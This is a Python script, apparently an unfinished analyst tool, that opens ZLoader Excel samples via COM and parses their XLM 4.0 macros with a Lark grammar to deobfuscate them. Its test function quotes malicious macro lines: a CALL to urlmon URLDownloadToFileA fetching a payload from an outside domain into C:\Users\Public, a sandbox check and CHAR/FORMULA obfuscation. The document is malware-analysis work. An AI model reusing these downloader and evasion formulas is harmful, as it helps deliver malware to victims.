from win32com.client import Dispatch
import re
import os
from lark import Lark


def column_string(n):
    string = ""
    while n > 0:
        n, remainder = divmod(n - 1, 26)
        string = chr(65 + remainder) + string
    return string


def column_number(s):
    number = 0
    power = 1
    for character in s:
        character = character.upper()
        digit = (ord(character) - ord('A')) *power
        number = number + digit
        power = power * 26

    return number + 1


def interpret_char_function(line):
    char_replace_res = line
    exist = False
    if 'FORMULA' not in line:
        char_replace_res = char_replace_res.replace('&', '')
        regex_char = "CHAR\((?P<number>\d{,3})\)"

        regex_char_compiled = re.compile(regex_char, re.MULTILINE)

        matches = regex_char_compiled.finditer(line)

        for matchNum, match in enumerate(matches, start=1):
            exist = True
            character = chr(int(match['number']))
            start = match.regs[match.pos][0]
            end = match.regs[match.pos][1]
            char_replace_res = char_replace_res.replace(match.string[start:end], character)

    return exist, char_replace_res


def interpret_formula_function(line, cells):
    regex_formula = "FORMULA\((?P<arg1>[^,]+),(?P<arg2>[^\)]+)\)"
    exist = False
    matches = re.finditer(regex_formula, line, re.MULTILINE)
    result = line[1:]
    for matchNum, match in enumerate(matches, start=1):
        exist = True
        arg1 = match['arg1']
        params = arg1.split('&')
        start = match.regs[match.pos][0]
        end = match.regs[match.pos][1]

        tmp = ''
        for param in params:
            absolute_name = param.replace('$', '')
            if absolute_name in cells:
                tmp += cells[absolute_name][1:]
            else:
                tmp += param

        result = result.replace(match.string[start:end], tmp)

    return exist, result


def get_formula_cells(sheet):
    formulas = {}
    for cell in sheet.UsedRange:
        formula = cell.FormulaLocal
        if formula and formula.startswith('='):
            formulas[column_string(cell.column) + str(cell.row)] = formula
    return formulas


def get_name_object(workbook, name):
    result = None

    name_objects =  workbook.Excel4MacroSheets.Application.Names

    for name_obj in name_objects:
        if name_obj.Name == name:
            result = name_obj
            break

    return result


def get_auto_open_cell(workbook, auto_run_obj):
    refers_to_sheet = None
    refers_to_cell = None

    sheet_name, cell_name  = auto_run_obj.RefersTo[1:].split('!')
    for sheet in workbook.Excel4MacroSheets:
        if sheet.Name == sheet_name:
            refers_to_sheet = sheet
            refers_to_cell = get_cell(refers_to_sheet, cell_name)
            break
    return refers_to_sheet, refers_to_cell


def get_cell(sheet, cell_name):
    column, row = filter(None, cell_name.split('$'))

    return sheet.Cells(int(row), column_number(column))


def process_cell(sheet, cell, depth):

    next_cell = None
    next_depth = None
    value = None

    text = cell.Text
    parse_tree = xlm_parser.parse(text)

    return value, next_cell, next_depth


def get_entry_macrosheet(workbook):
    auto_open_name_object = get_name_object(workbook, 'Auto_Open')
    active_sheet, active_cell = get_auto_open_cell(workbook, auto_open_name_object)

    current_cell = active_cell
    depth = 1
    while current_cell and depth < 20:
        value, current_cell, depth = process_cell(active_sheet, current_cell, depth)
        if value:
            print(value)


def test_parser():
    print("\n=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)")
    print(xlm_parser.parse("=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)"))
    print("\n=RUN($DC$240)")
    print(xlm_parser.parse("=RUN($DC$240)"))
    print("\n=CHAR($IE$1109-308)")
    print(xlm_parser.parse("=CHAR($IE$1109-308)"))
    print("\n=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)")
    print(xlm_parser.parse("=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)"))
    print("\n=HALT()")
    print(xlm_parser.parse("=HALT()"))
    print('\n=WAIT(NOW()+"00:00:03")')
    print(xlm_parser.parse('=WAIT(NOW()+"00:00:03")'))
    print("\n=IF(GET.WORKSPACE(19),,CLOSE(TRUE))")
    print(xlm_parser.parse("=IF(GET.WORKSPACE(19),,CLOSE(TRUE))"))
    print("""\n=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)""")
    print(xlm_parser.parse("""=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)"""))


if __name__ == '__main__':

    macro_grammar = open('xlm-macro.lark', 'r', encoding='utf_8').read()
    xlm_parser = Lark(macro_grammar)

    test_parser()

    excel = Dispatch("Excel.Application")

    zloader_samples_dir = r"C:\Users\user\Downloads\samples\zloader"

    with open(r'result\zloader.txt', 'w', encoding='utf_8') as output:
        for excel_file in os.listdir(zloader_samples_dir):
            try:
                print(excel_file)
                output.write('SHA256: ' + excel_file + '\n')
                wb = excel.Workbooks.Open(os.path.join(zloader_samples_dir, excel_file))
                macrosheet = get_entry_macrosheet(wb)
                break
            except Exception as error:
                print(error)
            finally:
                output.write('\n')
                output.flush()
